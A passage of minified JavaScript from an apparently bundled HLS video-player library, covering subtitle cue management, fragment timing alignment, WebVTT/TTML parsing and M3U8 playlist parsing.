0!==(ta=ta.url)&&0!==ta.indexOf("data:")||(ta=ca.url),ta}function m(ta,ca){try{var n=new Event("addtrack")}catch(k){(n=document.createEvent("Event")).initEvent("addtrack",!1,!1)}n.track=ta,ca.dispatchEvent(n)}function p(ta,ca){var n=ta.mode;if("disabled"===n&&(ta.mode="hidden"),ta.cues&&!ta.cues.getCueById(ca.id))try{if(ta.addCue(ca),!ta.cues.getCueById(ca.id))throw Error("addCue is failed for: "+ca)}catch(e){Fa.b.debug("[texttrack-utils]: "+e);var k=new self.TextTrackCue(ca.startTime,ca.endTime,ca.text);k.id=ca.id,ta.addCue(k)}"disabled"===n&&(ta.mode=n)}function l(ta){var ca=ta.mode;if("disabled"===ca&&(ta.mode="hidden"),ta.cues){for(var n=ta.cues.length;n--;)ta.removeCue(ta.cues[n]);"disabled"===ca&&(ta.mode=ca)}}function f(ta,ca,n){var k=ta.mode;if("disabled"===k&&(ta.mode="hidden"),ta.cues&&ta.cues.length){for(ca=function(e,y,K){var ea=[],sa=function(Ha,Ua){if(Ua<Ha[0].startTime)return 0;var kb=Ha.length-1;if(Ua>Ha[kb].endTime)return-1;for(var cb=0,ub=kb;cb<=ub;){var gb=Math.floor((ub+cb)/2);if(Ua<Ha[gb].startTime)ub=gb-1;else{if(!(Ua>Ha[gb].startTime&&cb<kb))return gb;cb=gb+1}}return Ha[cb].startTime-Ua<Ua-Ha[ub].startTime?cb:ub}(e,y);if(-1<sa)for(var ya=e.length;sa<ya;sa++){var Ea=e[sa];if(Ea.startTime>=y&&Ea.endTime<=K)ea.push(Ea);else if(Ea.startTime>K)break}return ea}(ta.cues,ca,n),n=0;n<ca.length;n++)ta.removeCue(ca[n]);"disabled"===k&&(ta.mode=k)}}function r(ta,ca,n){switch(ca){case"audio":ta.audioGroupIds||(ta.audioGroupIds=[]),ta.audioGroupIds.push(n);break;case"text":ta.textGroupIds||(ta.textGroupIds=[]),ta.textGroupIds.push(n)}}function x(ta){var ca={};ta.forEach((function(n){var k=n.groupId||"";n.id=ca[k]=ca[k]||0,ca[k]++}))}function z(ta,ca){var n=ca.startPTS;if(Object($a.a)(n)){var k,e=0;ca.sn>ta.sn?(e=n-ta.start,k=ta):(e=ta.start-n,k=ca),k.duration!==e&&(k.duration=e)}else ca.sn>ta.sn?ta.cc===ca.cc&&ta.minEndPTS?ca.start=ta.start+(ta.minEndPTS-ta.start):ca.start=ta.start+ta.duration:ca.start=Math.max(ta.start-ca.duration,0)}function J(ta,ca,n,k,e,y){0>=k-n&&(Fa.b.warn("Fragment should have a positive duration",ca),k=n+ca.duration,y=e+ca.duration);var K=n,ea=k,sa=ca.startPTS,ya=ca.endPTS;if(Object($a.a)(sa)&&(K=Math.abs(sa-n),Object($a.a)(ca.deltaPTS)?ca.deltaPTS=Math.max(K,ca.deltaPTS):ca.deltaPTS=K,K=Math.max(n,sa),n=Math.min(n,sa),e=Math.min(e,ca.startDTS),ea=Math.min(k,ya),k=Math.max(k,ya),y=Math.max(y,ca.endDTS)),ca.duration=k-n,sa=n-ca.start,ca.appendedPTS=k,ca.start=ca.startPTS=n,ca.maxStartPTS=K,ca.startDTS=e,ca.endPTS=k,ca.minEndPTS=ea,ca.endDTS=y,n=ca.sn,!ta||n<ta.startSN||n>ta.endSN)return 0;for(n-=ta.startSN,(k=ta.fragments)[n]=ca,ca=n;0<ca;ca--)z(k[ca],k[ca-1]);for(ca=n;ca<k.length-1;ca++)z(k[ca],k[ca+1]);return ta.fragmentHint&&z(k[k.length-1],ta.fragmentHint),ta.PTSKnown=ta.alignedSliding=!0,sa}function D(ta,ca){var n=ca.startSN+ca.skippedSegments-ta.startSN,k=ta.fragments;if(ta=ca.fragments,!(0>n||n>=k.length)&&(n=k[n].start)){for(k=ca.skippedSegments;k<ta.length;k++)ta[k].start+=n;ca.fragmentHint&&(ca.fragmentHint.start+=n)}}function I(){return(I=Object.assign||function(ta){for(var ca=1;ca<arguments.length;ca++){var k,n=arguments[ca];for(k in n)Object.prototype.hasOwnProperty.call(n,k)&&(ta[k]=n[k])}return ta}).apply(this,arguments)}function G(ta,ca){return(G=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function N(ta){var ca,n;return ta.buffered&&((null===(ca=ta.range.video)||void 0===ca?void 0:ca.partial)||(null===(n=ta.range.audio)||void 0===n?void 0:n.partial))}function w(ta){return ta.type+"_"+ta.level+"_"+ta.urlId+"_"+ta.sn}function h(ta,ca){ta&&(ca=ta.start+ca,ta.start=ta.startPTS=ca,ta.endPTS=ca+ta.duration)}function F(ta,ca){for(var n=ca.fragments,k=0,e=n.length;k<e;k++)h(n[k],ta);ca.fragmentHint&&h(ca.fragmentHint,ta),ca.alignedSliding=!0}function P(ta,ca,n){if(ca){if(ca.details&&(n.endCC>n.startCC||ta&&ta.cc<n.startCC)){a:{ta=ca.details.fragments;var k=n.fragments;if(k.length&&ta.length){for(var e=null,y=0,K=ta.length;y<K;y++){var ea=ta[y];if(ea&&ea.cc===k[0].cc){e=ea;break}}if((ta=e)&&(!ta||ta.startPTS))break a;Fa.b.log("No frag in previous level to align on")}else Fa.b.log("No fragments to align");ta=void 0}ta&&Object($a.a)(ta.start)&&(Fa.b.log("Adjusting PTS using last level due to CC increase within current level "+n.url),F(ta.start,n))}!n.alignedSliding&&ca.details&&O(n,ca.details),n.alignedSliding||!ca.details||n.skippedSegments||D(ca.details,n)}}function O(ta,ca){if(ca.fragments.length&&ta.hasProgramDateTime&&ca.hasProgramDateTime){var n=ca.fragments[0].programDateTime,k=ta.fragments[0].programDateTime;(ca=(k-n)/1e3+ca.fragments[0].start)&&Object($a.a)(ca)&&(Fa.b.log("Adjusting PTS using programDateTime delta "+(k-n)+"ms, sliding:"+ca.toFixed(3)+" "+ta.url+" "),F(ca,ta))}}function R(ta,ca,n){if(null===ca||!Array.isArray(ta)||!ta.length||!Object($a.a)(ca)||ca<(ta[0].programDateTime||0)||ca>=(ta[ta.length-1].endProgramDateTime||0))return null;n=n||0;for(var k=0;k<ta.length;++k){var e=ta[k];if((e.endProgramDateTime||0)-1e3*Math.min(n,e.duration+(e.deltaPTS?e.deltaPTS:0))>ca)return e}return null}function Q(ta,ca,n,k){void 0===n&&(n=0),void 0===k&&(k=0);var e=null;return ta?e=ca[ta.sn-ca[0].sn+1]:0===n&&0===ca[0].start&&(e=ca[0]),e&&0===ja(n,k,e)?e:Jb.search(ca,ja.bind(null,n,k))||e}function ja(ta,ca,n){return void 0===ta&&(ta=0),void 0===ca&&(ca=0),ca=Math.min(ca,n.duration+(n.deltaPTS?n.deltaPTS:0)),n.start+n.duration-ca<=ta?1:n.start-ca>ta&&n.start?-1:0}function W(ta){var ca="function"==typeof Map?new Map:void 0;return(W=function(n){function k(){return aa(n,arguments,B(this).constructor)}if(null===n||(e=n,-1===Function.toString.call(e).indexOf("[native code]")))return n;var e;if("function"!=typeof n)throw new TypeError("Super expression must either be null or a function");if(void 0!==ca){if(ca.has(n))return ca.get(n);ca.set(n,k)}return k.prototype=Object.create(n.prototype,{constructor:{value:k,enumerable:!1,writable:!0,configurable:!0}}),H(k,n)})(ta)}function aa(ta,ca,n){return(aa=function ma(){if("undefined"==typeof Reflect||!Reflect.construct||Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(ta){return!1}}()?Reflect.construct:function(k,e,y){var K=[null];return K.push.apply(K,e),k=new(Function.bind.apply(k,K)),y&&H(k,y.prototype),k}).apply(null,arguments)}function H(ta,ca){return(H=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function B(ta){return(B=Object.setPrototypeOf?Object.getPrototypeOf:function(ca){return ca.__proto__||Object.getPrototypeOf(ca)})(ta)}function A(ta,ca){void 0===ca&&(ca=null);var n=ca||ta;return ta={frag:ta,part:ca,responseType:"arraybuffer",url:n.url,rangeStart:0,rangeEnd:0},ca=n.byteRangeStartOffset,n=n.byteRangeEndOffset,Object($a.a)(ca)&&Object($a.a)(n)&&(ta.rangeStart=ca,ta.rangeEnd=n),ta}function Z(ta,ca){return(Z=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function T(ta,ca){return(T=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function ia(){return(ia=Object.assign||function(ta){for(var ca=1;ca<arguments.length;ca++){var k,n=arguments[ca];for(k in n)Object.prototype.hasOwnProperty.call(n,k)&&(ta[k]=n[k])}return ta}).apply(this,arguments)}function S(ta,ca){return(S=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function oa(ta,ca){return(oa=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function ha(ta,ca){return(ha=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function la(ta,ca){return(la=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function C(ta){for(var ca=[],n=0;n<ta.length;n++){var k=ta[n];"subtitles"===k.kind&&k.label&&ca.push(ta[n])}return ca}function fa(ta){return(ta=ta.match(/^(?:(\d+):)?(\d{2}):(\d{2})(\.\d+)?/))?59<parseFloat(ta[2])?3600*(0|ta[2])+60*(0|ta[3])+parseFloat(ta[4]||0):3600*(0|ta[1])+60*(0|ta[2])+(0|ta[3])+parseFloat(ta[4]||0):null}function qa(ta,ca,n,k){for(var e in ta=k?ta.split(k):[ta])"string"==typeof ta[e]&&2===(k=ta[e].split(n)).length&&ca(k[0],k[1])}function va(ta,ca,n){function k(){var K=fa(ta);if(null===K)throw Error("Malformed timestamp: "+y);return ta=ta.replace(/^[^\sa-zA-Z-]+/,""),K}function e(){ta=ta.replace(/^\s+/,"")}var K,ea,sa,y=ta;if(e(),ca.startTime=k(),e(),"--\x3e"!==ta.substr(0,3))throw Error("Malformed time stamp (time stamps must be separated by '--\x3e'): "+y);ta=ta.substr(3),e(),ca.endTime=k(),e(),K=ta,ea=ca,sa=new Nd,qa(K,(function(ya,Ea){switch(ya){case"region":for(var Ha=n.length-1;0<=Ha;Ha--)if(n[Ha].id===Ea){sa.set(ya,n[Ha].region);break}break;case"vertical":sa.alt(ya,Ea,["rl","lr"]);break;case"line":Ea=Ea.split(","),sa.integer(ya,Ea[0]),sa.percent(ya,Ea[0])&&sa.set("snapToLines",!1),sa.alt(ya,Ea[0],["auto"]),2===Ea.length&&sa.alt("lineAlign",Ea[1],["start",Xc,"end"]);break;case"position":Ea=Ea.split(","),sa.percent(ya,Ea[0]),2===Ea.length&&sa.alt("positionAlign",Ea[1],["start",Xc,"end","line-left","line-right","auto"]);break;case"size":sa.percent(ya,Ea);break;case"align":sa.alt(ya,Ea,["start",Xc,"end","left","right"])}}),/:/,/\s/),ea.region=sa.get("region",null),ea.vertical=sa.get("vertical",""),"auto"===(K=sa.get("line","auto"))&&-1===Fd.line&&(K=-1),ea.line=K,ea.lineAlign=sa.get("lineAlign","start"),ea.snapToLines=sa.get("snapToLines",!0),ea.size=sa.get("size",100),ea.align=sa.get("align",Xc),"auto"===(K=sa.get("position","auto"))&&50===Fd.position&&(K="start"===ea.align||"left"===ea.align?0:"end"===ea.align||"right"===ea.align?100:50),ea.position=K}function xa(ta,ca,n){return Gd(ta.toString())+Gd(ca.toString())+Gd(n)}function Ca(){return(Ca=Object.assign||function(ta){for(var ca=1;ca<arguments.length;ca++){var k,n=arguments[ca];for(k in n)Object.prototype.hasOwnProperty.call(n,k)&&(ta[k]=n[k])}return ta}).apply(this,arguments)}function Ba(ta,ca,n,k,e){var y=Object(tb.b)(new Uint8Array(ta),["mdat"]);if(0!==y.length){y=y[0],ta=Object(hc.f)(new Uint8Array(ta,y.start,y.end-y.start)),ca=Object(od.c)(ca,1,n);try{k(function(K,ea){var sa=(new DOMParser).parseFromString(K,"text/xml").getElementsByTagName("tt")[0];if(!sa)throw Error("Invalid ttml");var ya={frameRate:30,subFrameRate:1,frameRateMultiplier:0,tickRate:0},Ea=Object.keys(ya).reduce((function(cb,ub){return cb[ub]=sa.getAttribute("ttp:"+ub)||ya[ub],cb}),{}),Ha="preserve"!==sa.getAttribute("xml:space"),Ua=Ra(Ga(sa,"styling","style")),kb=Ra(Ga(sa,"layout","region"));return K=Ga(sa,"body","[begin]"),[].map.call(K,(function(cb){var ub=function Ec(ic,$b){return[].slice.call(ic.childNodes).reduce((function(Lb,Gc,Yc){var Kc;return"br"===Gc.nodeName&&Yc?Lb+"\n":null!==(Kc=Gc.childNodes)&&void 0!==Kc&&Kc.length?Ec(Gc,$b):$b?Lb+Gc.textContent.trim().replace(/\s+/g," "):Lb+Gc.textContent}),"")}(cb,Ha);if(!ub||!cb.hasAttribute("begin"))return null;var ic,$b,gb=Ya(cb.getAttribute("begin"),Ea),Gb=Ya(cb.getAttribute("dur"),Ea),wb=Ya(cb.getAttribute("end"),Ea);if(null===gb)throw La(cb);if(null===wb){if(null===Gb)throw La(cb);wb=gb+Gb}return(ub=new ud(gb-ea,wb-ea,ub)).id=xa(ub.startTime,ub.endTime,ub.text),gb=kb[cb.getAttribute("region")],cb=Ua[cb.getAttribute("style")],ub.position=10,ub.size=80,ic=gb,$b=cb,(gb=(cb="displayAlign textAlign color backgroundColor fontSize fontFamily".split(" ").reduce((function(Ec,Lb){var Gc;return(Gc=$b.hasAttributeNS("http://www.w3.org/ns/ttml#styling",Lb)?$b.getAttributeNS("http://www.w3.org/ns/ttml#styling",Lb):null)||(Gc=ic.hasAttributeNS("http://www.w3.org/ns/ttml#styling",Lb)?ic.getAttributeNS("http://www.w3.org/ns/ttml#styling",Lb):null),Gc&&(Ec[Lb]=Gc),Ec}),{})).textAlign)&&((Gb=ue[gb])&&(ub.lineAlign=Gb),ub.align=gb),Ca(ub,cb),ub})).filter((function(cb){return null!==cb}))}(ta,ca))}catch(K){e(K)}}else e(Error("Could not parse IMSC1 mdat"))}function Ga(ta,ca,n){return(ta=ta.getElementsByTagName(ca)[0])?[].slice.call(ta.querySelectorAll(n)):[]}function Ra(ta){return ta.reduce((function(ca,n){var k=n.getAttribute("xml:id");return k&&(ca[k]=n),ca}),{})}function La(ta){return Error("Could not parse ttml timestamp "+ta)}function Ya(ta,ca){if(!ta)return null;var k,e,n=fa(ta);return null===n&&(ge.test(ta)?(k=ta,e=ca,n=3600*(0|(k=ge.exec(k))[1])+60*(0|k[2])+(0|k[3])+((0|k[4])+(0|k[5])/e.subFrameRate)/e.frameRate):Pd.test(ta)&&(n=function(k,e){k=Pd.exec(k);var y=Number(k[1]);switch(k[2]){case"h":return 3600*y;case"m":return 60*y;case"ms":return 1e3*y;case"f":return y/e.frameRate;case"t":return y/e.tickRate}return y}(ta,ca))),n}function hb(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}function Da(ta){var ca="function"==typeof Map?new Map:void 0;return(Da=function(n){function k(){return Pa(n,arguments,qb(this).constructor)}if(null===n||(e=n,-1===Function.toString.call(e).indexOf("[native code]")))return n;var e;if("function"!=typeof n)throw new TypeError("Super expression must either be null or a function");if(void 0!==ca){if(ca.has(n))return ca.get(n);ca.set(n,k)}return k.prototype=Object.create(n.prototype,{constructor:{value:k,enumerable:!1,writable:!0,configurable:!0}}),Ta(k,n)})(ta)}function Pa(ta,ca,n){return(Pa=function eb(){if("undefined"==typeof Reflect||!Reflect.construct||Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(ta){return!1}}()?Reflect.construct:function(k,e,y){var K=[null];return K.push.apply(K,e),k=new(Function.bind.apply(k,K)),y&&Ta(k,y.prototype),k}).apply(null,arguments)}function Ta(ta,ca){return(Ta=Object.setPrototypeOf||function(n,k){return n.__proto__=k,n})(ta,ca)}function qb(ta){return(qb=Object.setPrototypeOf?Object.getPrototypeOf:function(ca){return ca.__proto__||Object.getPrototypeOf(ca)})(ta)}function ib(ta,ca){return new self.Request(ta.url,ca)}function mb(){return(mb=Object.assign||function(ta){for(var ca=1;ca<arguments.length;ca++){var k,n=arguments[ca];for(k in n)Object.prototype.hasOwnProperty.call(n,k)&&(ta[k]=n[k])}return ta}).apply(this,arguments)}function Db(ta,ca){var n=Object.keys(ta);if(Object.getOwnPropertySymbols){var k=Object.getOwnPropertySymbols(ta);ca&&(k=k.filter((function(e){return Object.getOwnPropertyDescriptor(ta,e).enumerable}))),n.push.apply(n,k)}return n}function Ab(ta){for(var ca=1;ca<arguments.length;ca++){var n=null!=arguments[ca]?arguments[ca]:{};ca%2?Db(Object(n),!0).forEach((function(k){var e=n[k];k in ta?Object.defineProperty(ta,k,{value:e,enumerable:!0,configurable:!0,writable:!0}):ta[k]=e})):Object.getOwnPropertyDescriptors?Object.defineProperties(ta,Object.getOwnPropertyDescriptors(n)):Db(Object(n)).forEach((function(k){Object.defineProperty(ta,k,Object.getOwnPropertyDescriptor(n,k))}))}return ta}function db(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}Na.r(Va),Na.d(Va,"default",(function(){return rc}));var ob,lb,ta,Za=Na(10),$a=Na(3),ua=Na(0),Ka=Na(2),Fa=Na(1),tb=Na(5),Eb=Na(4),Sa=function(){function ta(n){this.alignedSliding=this.PTSKnown=!1,this.averagetargetduration=void 0,this.endSN=this.endCC=0,this.fragmentHint=this.fragments=void 0,this.initSegment=this.partList=null,this.live=!0,this.ageHeader=0,this.advancedDateTime=void 0,this.advanced=this.updated=!0,this.availabilityDelay=void 0,this.misses=0,this.needSidxRanges=!1,this.startSN=this.startCC=0,this.startTimeOffset=null,this.totalduration=this.targetduration=0,this.type=null,this.url=void 0,this.m3u8="",this.version=null,this.canBlockReload=!1,this.canSkipUntil=0,this.canSkipDateRanges=!1,this.skippedSegments=0,this.recentlyRemovedDateranges=void 0,this.partTarget=this.holdBack=this.partHoldBack=0,this.renditionReports=this.preloadHint=void 0,this.tuneInGoal=0,this.deltaUpdateFailed=void 0,this.driftEnd=this.driftStart=this.driftEndTime=this.driftStartTime=0,this.fragments=[],this.url=n}var ca;return ta.prototype.reloaded=function(n){if(!n)return this.advanced=!0,void(this.updated=!0);var k=this.lastPartSn-n.lastPartSn,e=this.lastPartIndex-n.lastPartIndex;this.updated=this.endSN!==n.endSN||!!e||!!k,this.advanced=this.endSN>n.endSN||0<k||0===k&&0<e,this.updated||this.advanced?this.misses=Math.floor(.6*n.misses):this.misses=n.misses+1,this.availabilityDelay=n.availabilityDelay},ca=[{key:"hasProgramDateTime",get:function(){return!!this.fragments.length&&Object($a.a)(this.fragments[this.fragments.length-1].programDateTime)}},{key:"levelTargetDuration",get:function(){return this.averagetargetduration||this.targetduration||10}},{key:"drift",get:function(){var n=this.driftEndTime-this.driftStartTime;return 0<n?1e3*(this.driftEnd-this.driftStart)/n:1}},{key:"edge",get:function(){return this.partEnd||this.fragmentEnd}},{key:"partEnd",get:function(){var n;return null!==(n=this.partList)&&void 0!==n&&n.length?this.partList[this.partList.length-1].end:this.fragmentEnd}},{key:"fragmentEnd",get:function(){var n;return null!==(n=this.fragments)&&void 0!==n&&n.length?this.fragments[this.fragments.length-1].end:0}},{key:"age",get:function(){return this.advancedDateTime?Math.max(Date.now()-this.advancedDateTime,0)/1e3:0}},{key:"lastPartIndex",get:function(){var n;return null!==(n=this.partList)&&void 0!==n&&n.length?this.partList[this.partList.length-1].index:-1}},{key:"lastPartSn",get:function(){var n;return null!==(n=this.partList)&&void 0!==n&&n.length?this.partList[this.partList.length-1].fragment.sn:this.endSN}}],function Oa(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ta.prototype,ca),ta}(),rb=Na(16),nb=/^(\d+)x(\d+)$/,Bb=/\s*(.+?)\s*=((?:".*?")|.*?)(?:,|$)/g,Ib=function(){function ta(n){for(var k in"string"==typeof n&&(n=ta.parseAttrList(n)),n)n.hasOwnProperty(k)&&(this[k]=n[k])}var ca=ta.prototype;return ca.decimalInteger=function(n){return(n=parseInt(this[n],10))>Number.MAX_SAFE_INTEGER?1/0:n},ca.hexadecimalInteger=function(n){if(this[n]){n=(1&(n=(this[n]||"0x").slice(2)).length?"0":"")+n;for(var k=new Uint8Array(n.length/2),e=0;e<n.length/2;e++)k[e]=parseInt(n.slice(2*e,2*e+2),16);return k}return null},ca.hexadecimalIntegerAsNumber=function(n){return(n=parseInt(this[n],16))>Number.MAX_SAFE_INTEGER?1/0:n},ca.decimalFloatingPoint=function(n){return parseFloat(this[n])},ca.optionalFloat=function(n,k){return(n=this[n])?parseFloat(n):k},ca.enumeratedString=function(n){return this[n]},ca.bool=function(n){return"YES"===this[n]},ca.decimalResolution=function(n){if(null!==(n=nb.exec(this[n])))return{width:parseInt(n[1],10),height:parseInt(n[2],10)}},ta.parseAttrList=function(n){var k,e={};for(Bb.lastIndex=0;null!==(k=Bb.exec(n));){var y=k[2];0===y.indexOf('"')&&y.lastIndexOf('"')===y.length-1&&(y=y.slice(1,-1)),e[k[1]]=y}return e},ta}(),Qb={audio:{a3ds:!0,"ac-3":!0,"ac-4":!0,alac:!0,alaw:!0,dra1:!0,"dts+":!0,"dts-":!0,dtsc:!0,dtse:!0,dtsh:!0,"ec-3":!0,enca:!0,g719:!0,g726:!0,m4ae:!0,mha1:!0,mha2:!0,mhm1:!0,mhm2:!0,mlpa:!0,mp4a:!0,"raw ":!0,Opus:!0,samr:!0,sawb:!0,sawp:!0,sevc:!0,sqcp:!0,ssmv:!0,twos:!0,ulaw:!0},video:{avc1:!0,avc2:!0,avc3:!0,avc4:!0,avcp:!0,av01:!0,drac:!0,dvav:!0,dvhe:!0,encv:!0,hev1:!0,hvc1:!0,mjp2:!0,mp4v:!0,mvc1:!0,mvc2:!0,mvc3:!0,mvc4:!0,resv:!0,rv60:!0,s263:!0,svc1:!0,svc2:!0,"vc-1":!0,vp08:!0,vp09:!0},text:{stpp:!0,wvtt:!0}},Vb=/#EXT-X-STREAM-INF:([^\r\n]*)(?:[\r\n](?:#[^\r\n]*)?)*([^\r\n]+)|#EXT-X-SESSION-DATA:([^\r\n]*)[\r\n]+/g,Zb=/#EXT-X-MEDIA:(.*)/g,oc=new RegExp([/#EXTINF:\s*(\d*(?:\.\d+)?)(?:,(.*)\s+)?/.source,/(?!#) *(\S[\S ]*)/.source,/#EXT-X-BYTERANGE:*(.+)/.source,/#EXT-X-PROGRAM-DATE-TIME:(.+)/.source,/#.*/.source].join("|"),"g"),pc=new RegExp([/#(EXTM3U)/.source,/#EXT-X-(PLAYLIST-TYPE):(.+)/.source,/#EXT-X-(MEDIA-SEQUENCE): *(\d+)/.source,/#EXT-X-(SKIP):(.+)/.source,/#EXT-X-(TARGETDURATION): *(\d+)/.source,/#EXT-X-(KEY):(.+)/.source,/#EXT-X-(START):(.+)/.source,/#EXT-X-(ENDLIST)/.source,/#EXT-X-(DISCONTINUITY-SEQ)UENCE: *(\d+)/.source,/#EXT-X-(DIS)CONTINUITY/.source,/#EXT-X-(VERSION):(\d+)/.source,/#EXT-X-(MAP):(.+)/.source,/#EXT-X-(SERVER-CONTROL):(.+)/.source,/#EXT-X-(PART-INF):(.+)/.source,/#EXT-X-(GAP)/.source,/#EXT-X-(BITRATE):\s*(\d+)/.source,/#EXT-X-(PART):(.+)/.source,/#EXT-X-(PRELOAD-HINT):(.+)/.source,/#EXT-X-(RENDITION-REPORT):(.+)/.source,/(#)([^:]*):(.*)/.source,/(#)(.*)(?:.*)\r?\n?/.source].join("|")),Xa=/\.(mp4|m4s|m4v|m4a)$/i,Kb=function(){function ta(){}return ta.findGroup=function(ca,n){for(var k=0;k<ca.length;k++){var e=ca[k];if(e.id===n)return e}},ta.convertAVC1ToAVCOTI=function(ca){var n=ca.split(".");return 2<n.length?(ca=n.shift()+".",(ca+=parseInt(n.shift()).toString(16))+("000"+parseInt(n.shift()).toString(16)).substr(-4)):ca},ta.resolve=function(ca,n){return Za.buildAbsoluteURL(n,ca,{alwaysNormalize:!0})},ta.parseMasterPlaylist=function(ca,n){var k,e=[],y={},K=!1;for(Vb.lastIndex=0;null!=(k=Vb.exec(ca));)if(k[1]){var ea=new Ib(k[1]);k={attrs:ea,bitrate:ea.decimalInteger("AVERAGE-BANDWIDTH")||ea.decimalInteger("BANDWIDTH"),name:ea.NAME,url:ta.resolve(k[2],n)};var sa=ea.decimalResolution("RESOLUTION");sa&&(k.width=sa.width,k.height=sa.height),da((ea.CODECS||"").split(/[ ,]+/).filter((function(ya){return ya})),k),k.videoCodec&&-1!==k.videoCodec.indexOf("avc1")&&(k.videoCodec=ta.convertAVC1ToAVCOTI(k.videoCodec)),e.push(k)}else k[3]&&(ea=new Ib(k[3]))["DATA-ID"]&&(K=!0,y[ea["DATA-ID"]]=ea);return{levels:e,sessionData:K?y:null}},ta.parseMasterPlaylistMedia=function(ca,n,k,e){var y;void 0===e&&(e=[]);var K=[],ea=0;for(Zb.lastIndex=0;null!==(y=Zb.exec(ca));)if((y=new Ib(y[1])).TYPE===k){if(y={attrs:y,bitrate:0,id:ea++,groupId:y["GROUP-ID"],instreamId:y["INSTREAM-ID"],name:y.NAME||y.LANGUAGE||"",type:k,default:y.bool("DEFAULT"),autoselect:y.bool("AUTOSELECT"),forced:y.bool("FORCED"),lang:y.LANGUAGE,url:y.URI?ta.resolve(y.URI,n):""},e.length){var sa=ta.findGroup(e,y.groupId)||e[0],ya=sa.audioCodec;ya&&(y.audioCodec=ya),(sa=sa.textCodec)&&(y.textCodec=sa)}K.push(y)}return K},ta.parseLevelPlaylist=function(ca,n,k,e,y){var K,ea,sa,ya=new Sa(n),Ea=ya.fragments,Ha=0,Ua=0,kb=0,cb=0,ub=null,gb=new Eb.b(e,n),Gb=-1;for(oc.lastIndex=0,ya.m3u8=ca;null!==(K=oc.exec(ca));){var wb=K[1];if(wb)gb.duration=parseFloat(wb),K=(" "+K[2]).slice(1),gb.title=K||null,gb.tagList.push(K?["INF",wb,K]:["INF",wb]);else if(K[3])Object($a.a)(gb.duration)&&(gb.start=kb,sa&&(gb.levelkey=sa),gb.sn=Ha,gb.level=k,gb.cc=cb,gb.urlId=y,Ea.push(gb),gb.relurl=(" "+K[3]).slice(1),M(gb,ub),ub=gb,kb+=gb.duration,Ha++,Ua=0,(gb=new Eb.b(e,n)).start=kb,gb.sn=Ha,gb.cc=cb,gb.level=k);else if(K[4])wb=(" "+K[4]).slice(1),ub?gb.setByteRange(wb,ub):gb.setByteRange(wb);else if(K[5])gb.rawProgramDateTime=(" "+K[5]).slice(1),gb.tagList.push(["PROGRAM-DATE-TIME",gb.rawProgramDateTime]),-1===Gb&&(Gb=Ea.length);else if(K=K[0].match(pc)){for(ea=1;ea<K.length&&void 0===K[ea];ea++);var bc=(" "+K[ea]).slice(1);switch(wb=(" "+K[ea+1]).slice(1),ea=K[ea+2]?(" "+K[ea+2]).slice(1):"",bc){case"PLAYLIST-TYPE":ya.type=wb.toUpperCase();break;case"MEDIA-SEQUENCE":Ha=ya.startSN=parseInt(wb);break;case"SKIP":if(K=(wb=new Ib(wb)).decimalInteger("SKIPPED-SEGMENTS"),Object($a.a)(K)){for(bc=ya.skippedSegments=K;bc--;)Ea.unshift(null);Ha+=K}(wb=wb.enumeratedString("RECENTLY-REMOVED-DATERANGES"))&&(ya.recentlyRemovedDateranges=wb.split("\t"));break;case"TARGETDURATION":ya.targetduration=parseFloat(wb);break;case"VERSION":ya.version=parseInt(wb);break;case"EXTM3U":break;case"ENDLIST":ya.live=!1;break;case"#":(wb||ea)&&gb.tagList.push(ea?[wb,ea]:[wb]);break;case"DIS":cb++;case"GAP":gb.tagList.push([bc]);break;case"BITRATE":gb.tagList.push([bc,wb]);break;case"DISCONTINUITY-SEQ":cb=parseInt(wb);break;case"KEY":var ic,$b=new Ib(wb);wb=$b.enumeratedString("METHOD"),K=$b.URI,bc=$b.hexadecimalInteger("IV"),ea=$b.enumeratedString("KEYFORMATVERSIONS");var Ec=$b.enumeratedString("KEYID");if($b=null!=(ic=$b.enumeratedString("KEYFORMAT"))?ic:"identity",-1<["com.apple.streamingkeydelivery","com.microsoft.playready","urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed","com.widevine"].indexOf($b)){Fa.b.warn("Keyformat "+$b+" is not supported from the manifest");continue}if("identity"!==$b)continue;wb&&(sa=rb.a.fromURL(n,K),K&&0<=["AES-128","SAMPLE-AES","SAMPLE-AES-CENC"].indexOf(wb)&&(sa.method=wb,sa.keyFormat=$b,Ec&&(sa.keyID=Ec),ea&&(sa.keyFormatVersions=ea),sa.iv=bc));break;case"START":wb=new Ib(wb).decimalFloatingPoint("TIME-OFFSET"),Object($a.a)(wb)&&(ya.startTimeOffset=wb);break;case"MAP":wb=new Ib(wb),gb.relurl=wb.URI,wb.BYTERANGE&&gb.setByteRange(wb.BYTERANGE),gb.level=k,gb.sn="initSegment",sa&&(gb.levelkey=sa),ya.initSegment=gb,(gb=new Eb.b(e,n)).rawProgramDateTime=ya.initSegment.rawProgramDateTime;break;case"SERVER-CONTROL":wb=new 